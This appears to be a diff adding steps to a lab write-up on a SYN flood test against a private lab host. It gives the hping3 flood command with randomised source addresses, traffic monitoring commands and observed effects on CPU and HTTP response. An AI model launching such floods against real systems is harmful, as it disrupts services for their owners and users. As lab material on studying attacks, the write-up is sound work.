@@ -55,3 +55,25 @@ This causes:
 
 ```bash
 ping 192.168.56.102
+
+#Launch SYN Flood
+sudo hping3 -S --flood --rand-source -p 80 192.168.56.102
+
+Monitor Network Traffic
+sudo tcpdump -i eth0 port 80
+
+Test HTTP Response
+time curl -I http://192.168.56.102
+
+time curl -I --max-time 10 http://192.168.56.102
+
+#Monitoring Results
+#Before Attack
+CPU idle approximately 92%
+Minimal network activity
+Fast HTTP response
+#During Attack
+CPU usage increased significantly
+Large SYN packet flood detected
+HTTP response became slow
+Multiple half-open connections created
